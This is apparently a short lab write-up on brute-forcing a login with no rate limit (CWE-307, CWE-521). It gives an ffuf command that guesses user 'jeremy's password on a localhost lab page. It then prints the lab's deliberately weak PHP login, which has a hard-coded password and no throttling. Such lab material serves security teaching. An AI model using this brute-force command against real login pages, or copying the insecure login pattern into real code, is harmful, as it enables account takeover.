--------
**Difficulty**: EASY
**CWE-lists**:
- [[CWE-307(improper-restriction-of-excesive-authz-attempts)]]
- [[CWE-521(WEAK-password-requirements)]]
-------
A website login could be easily tested for rate limit by bruteforcing, if there's no rate limit we could bruteforce for a user. In this case we need to login in the jeremy's account:
```sh
ffuf -u http://localhost/labs/a0x01.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=jeremy&password=FUZZ" -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -ac -v -c
```

the source code it's probably the simplest PHP login
```php
<?php
require '../db.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    $status = 0;

    if ($username === "jeremy" && $password === "letmein") {
        $message = "You have successfully logged in!";
        $status = 1;
    } else {
        $message = "Your username or password was incorrect!";
        $status = 2;
    }
}

?>
```